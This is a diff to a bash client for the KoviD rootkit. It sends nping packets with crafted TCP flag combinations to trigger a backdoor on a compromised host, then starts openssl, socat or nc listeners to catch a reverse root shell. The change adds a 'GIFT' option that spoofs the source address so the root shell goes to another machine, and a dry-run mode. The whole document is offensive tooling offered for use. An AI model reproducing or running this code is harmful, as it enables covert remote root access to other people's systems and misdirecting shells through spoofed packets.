@@ -21,6 +21,8 @@ SOCAT="socat"
 NC="nc"
 NPING="nping"
 PERMDIR=$PREFIX/certs
+GIFT=${GIFT:-""}
+DRY=${DRY:-false}
 
 # Destination ports for
 # nping packets
@@ -59,7 +61,14 @@ usage="Use: [V=1] ./${0##*/} <method> <IP> <PORT>
         ./${0##*/} openssl 192.168.1.10 9999
 
     Verbose, example:
-        V=1 ./${0##*/} openssl 192.168.1.10 9999"
+        V=1 ./${0##*/} openssl 192.168.1.10 9999
+
+    Connect to GIFT address instead of this machine:
+        GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.10 443
+
+    If used alongside with GIFT, DRY(run) will NOT send KoviD instruction and will show client's command:
+        DRY=true GIFT=192.168.0.30 ./${0##*/} openssl 192.168.1.44 444"
+
 
 errexit() {
     echo "Error: $1"
@@ -86,10 +95,25 @@ if [[ "$UID" != 0 ]]; then
     errexit "nping settings we use require root" false 1
 fi
 
+[[ "$GIFT" != "" ]] && GIFT="-S $GIFT"
+
 check_certs() {
     if  [[ ! -f "$PERMDIR"/server.key ]]; then
         gencerts
     fi
+}
+
+listen() {
+    if [[ ! -z "$GIFT" ]]; then
+cat << EOF
+    If the receiving end of your gift [$GIFT] has run:
+        $ $@
+    Then hopefully the rootshell is now his
+EOF
+        return
+    fi
+    # shellcheck disable=SC2068
+    [[ "$DRY" == "false" ]] && $@
 }
 
 case $1 in
@@ -100,12 +124,13 @@ case $1 in
         f() {
             sleep 2
             [[ ! -n "$V" ]] && exec &>/dev/null
-            "$NPING" "$1" --tcp -p "$RR_OPENSSL" --flags Ack,rSt,pSh \
+            # shellcheck disable=SC2086
+            "$NPING" "$1" $GIFT --tcp -p "$RR_OPENSSL" --flags Ack,rSt,pSh \
                 --source-port "$2" -c 1
         }
-        f "$@" &
+        [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
-            "$OPENSSL" s_server -key key.pem -cert cert.pem -accept "$2"
+            listen "$OPENSSL" s_server -key key.pem -cert cert.pem -accept "$2"
             popd >/dev/null
         }
         ;;
@@ -116,12 +141,13 @@ case $1 in
         f() {
             sleep 2
             [[ ! -n "$V" ]] && exec &>/dev/null
-            "$NPING" "$1" --tcp -p "$RR_SOCAT" --flags Fin,Urg,aCK \
+            # shellcheck disable=SC2086
+            "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT" --flags Fin,Urg,aCK \
                 --source-port "$2" -c 1
         }
-        f "$@" &
+        [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
-            "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
+            listen "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
             popd >/dev/null
         }
         ;;
@@ -131,11 +157,12 @@ case $1 in
         f() {
             sleep 2
             [[ ! -n "$V" ]] && exec &>/dev/null
-             "$NPING" "$1" --tcp -p "$RR_NC" --flags Ack,rSt,pSh \
+            # shellcheck disable=SC2086
+             "$NPING" "$1" $GIFT --tcp -p "$RR_NC" --flags Ack,rSt,pSh \
                  --source-port "$2" -c 1
         }
-        f "$@" &
-        "$NC" -lvp "$2"
+        [[ "$DRY" == false ]] && f "$@" &
+        listen "$NC" -lvp "$2"
         ;;
     tty)
         shift
@@ -144,12 +171,13 @@ case $1 in
         f() {
             sleep 2
             [[ ! -n "$V" ]] && exec &>/dev/null
-            "$NPING" "$1" --tcp -p "$RR_SOCAT_TTY" --flags Cwr,Urg,fiN,rsT \
+            # shellcheck disable=SC2086
+            "$NPING" "$1" $GIFT --tcp -p "$RR_SOCAT_TTY" --flags Cwr,Urg,fiN,rsT \
                 --source-port "$2" -c 1
         }
-        f "$@" &
+        [[ "$DRY" == false ]] && f "$@" &
         pushd "$PERMDIR" >/dev/null && {
-            "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
+            listen "$SOCAT" -d -d OPENSSL-LISTEN:"$2",cert=server.pem,verify=0,fork STDOUT
             popd >/dev/null
         }
         ;;
